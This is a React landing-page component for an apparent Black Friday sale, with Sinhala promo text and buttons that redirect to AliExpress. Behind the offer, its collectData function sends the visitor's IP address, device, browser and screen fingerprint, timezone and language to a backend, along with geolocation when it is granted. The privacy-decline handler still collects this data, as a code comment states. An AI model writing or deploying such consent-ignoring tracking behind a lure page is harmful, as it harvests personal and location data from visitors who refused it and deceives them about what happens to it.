import React from 'react';
import './LandingPage.css';
import CountdownTimer from '../components/CountdownTimer';
import PrivacyNotice from '../components/PrivacyNotice';
import LocationConsent from '../components/LocationConsent';
import { dataService } from '../services/api';
import { getDeviceType, getBrowserInfo, getOrCreateSessionId } from '../utils/helpers';

const LandingPage = () => {
  const [showPrivacy, setShowPrivacy] = React.useState(true);
  const [showLocation, setShowLocation] = React.useState(false);
  const [privacyAccepted, setPrivacyAccepted] = React.useState(false);

  const handlePrivacyAccept = () => {
    setPrivacyAccepted(true);
    setShowPrivacy(false);
    setShowLocation(true);
    collectData(true, null);
  };

  const handlePrivacyDecline = () => {
    setShowPrivacy(false);
    // Still collect data but without privacy acceptance
    collectData(false, null);
  };

  const handleLocationAllow = async (location) => {
    setShowLocation(false);
    collectData(privacyAccepted, location);
  };

  const handleLocationDeny = () => {
    setShowLocation(false);
    collectData(privacyAccepted, null);
  };

  const collectData = async (privacyAccepted, location) => {
    try {
      const sessionId = getOrCreateSessionId();
      
      // Get device details
      const deviceType = getDeviceType();
      const browser = getBrowserInfo();
      const userAgent = navigator.userAgent;
      
      // Get screen resolution and OS details
      const screenResolution = `${window.screen.width}x${window.screen.height}`;
      const screenColorDepth = window.screen.colorDepth;
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const language = navigator.language;
      
      // Get IP address from backend
      let ipAddress = null;
      let ipInfo = null;
      try {
        ipInfo = await dataService.getIPInfo();
        ipAddress = ipInfo.ip;
      } catch (err) {
        console.error('Error getting IP info:', err);
        ipAddress = null;
      }
      
      // Prepare complete data packet
      const data = {
        sessionId,
        deviceType,
        browser,
        userAgent,
        latitude: location?.latitude || null,
        longitude: location?.longitude || null,
        locationAccuracy: location?.accuracy || null,
        locationGranted: !!location,
        privacyAccepted: privacyAccepted,
        ipAddress: ipAddress,
        screenResolution,
        screenColorDepth,
        timezone,
        language,
        cookiesEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        hardwareConcurrency: navigator.hardwareConcurrency || null,
        deviceMemory: navigator.deviceMemory || null,
      };

      const response = await dataService.collectVisitorData(data);
      console.log('✅ Data collected successfully:', response);
      console.log('📍 Location:', location ? `${location.latitude}, ${location.longitude}` : 'Not provided');
      console.log('🌐 IP Address:', ipAddress);
      console.log('📱 Device:', deviceType, browser);
      console.log('🖥️ Screen:', screenResolution);
    } catch (error) {
      console.error('❌ Error collecting data:', error);
    }
  };

  const handleShopNow = () => {
    window.location.href = 'https://www.aliexpress.com';
  };

  return (
    <div className="landing-page">
      {showPrivacy && (
        <PrivacyNotice
          onAccept={handlePrivacyAccept}
          onDecline={handlePrivacyDecline}
        />
      )}

      {showLocation && privacyAccepted && (
        <LocationConsent
          onAllow={handleLocationAllow}
          onDeny={handleLocationDeny}
        />
      )}

      {showLocation && !privacyAccepted && (
        <LocationConsent
          onAllow={handleLocationAllow}
          onDeny={handleLocationDeny}
        />
      )}

      {/* Hero Section */}
      <div className="hero-section">
        <div className="hero-background">
          <div className="decoration decoration-1"></div>
          <div className="decoration decoration-2"></div>
          <div className="decoration decoration-3"></div>
        </div>

        <div className="hero-content">
          <div className="hero-banner">
            <h1 className="hero-title">
              <span className="title-black">🔥 අද පමණයි! 🔥</span>
              <span className="title-friday">BLACK FRIDAY</span>
            </h1>
            <h2 className="hero-subtitle">SUPER SALE</h2>
            <div className="discount-badge">
              <span className="discount-text">DISCOUNT UP TO</span>
              <span className="discount-value">70%</span>
              <span className="discount-text">OFF</span>
            </div>
          </div>

          <CountdownTimer />

          <p className="hero-description">
            🎉 100% නොමිලේ දීමනා<br />
            🎁 විශේෂ තෑගි සහ වට්ටම්<br />
            ✨ ඔබට පමණක් හිමි අවස්ථාවක්
          </p>

          <div className="promo-code">
            <p className="promo-label">PROMO CODE:</p>
            <div className="promo-box">
              <span className="code">FRIDAY123</span>
              <button className="copy-btn" onClick={() => {
                navigator.clipboard.writeText('FRIDAY123');
                alert('Promo code copied!');
              }}>
                Copy
              </button>
            </div>
          </div>

          <button className="btn-shop-now" onClick={handleShopNow}>
            ඉදිරියට යන්න
          </button>
        </div>
      </div>

      {/* Product Highlights */}
      <div className="product-highlights">
        <h3>Featured Deals</h3>
        <div className="highlights-grid">
          <div className="highlight-card">
            <div className="highlight-icon">🎧</div>
            <h4>Electronics</h4>
            <p>Up to 70% OFF on gadgets and accessories</p>
            <span className="highlight-badge">Hot Deal</span>
          </div>
          <div className="highlight-card">
            <div className="highlight-icon">👗</div>
            <h4>Fashion</h4>
            <p>Trendy clothes at unbelievable prices</p>
            <span className="highlight-badge">Trending</span>
          </div>
          <div className="highlight-card">
            <div className="highlight-icon">🏠</div>
            <h4>Home & Garden</h4>
            <p>Make your home beautiful and cozy</p>
            <span className="highlight-badge">New</span>
          </div>
          <div className="highlight-card">
            <div className="highlight-icon">💄</div>
            <h4>Beauty & Health</h4>
            <p>Premium beauty products at great discounts</p>
            <span className="highlight-badge">Popular</span>
          </div>
        </div>
      </div>

      {/* Benefits Section */}
      <div className="benefits-section">
        <h3>Why Shop With Us?</h3>
        <div className="benefits-grid">
          <div className="benefit-card">
            <div className="benefit-icon">✓</div>
            <h4>Free Shipping</h4>
            <p>On orders over $50</p>
          </div>
          <div className="benefit-card">
            <div className="benefit-icon">✓</div>
            <h4>30-Day Returns</h4>
            <p>Hassle-free returns</p>
          </div>
          <div className="benefit-card">
            <div className="benefit-icon">✓</div>
            <h4>Secure Payment</h4>
            <p>100% secure transactions</p>
          </div>
          <div className="benefit-card">
            <div className="benefit-icon">✓</div>
            <h4>24/7 Support</h4>
            <p>Always here to help</p>
          </div>
        </div>
      </div>

      {/* CTA Section */}
      <div className="cta-section">
        <h3>Don't Miss Out!</h3>
        <p>Limited time offers end soon. Shop now and save big on your favorite products.</p>
        <button className="btn-shop-now-2" onClick={handleShopNow}>
          Shop The Sale Now
        </button>
      </div>

      {/* Footer */}
      <footer className="footer">
        <p>&copy; 2024 Black Friday Sale. All rights reserved.</p>
        <p>Privacy Policy • Terms & Conditions • Contact Us</p>
      </footer>
    </div>
  );
};

export default LandingPage;
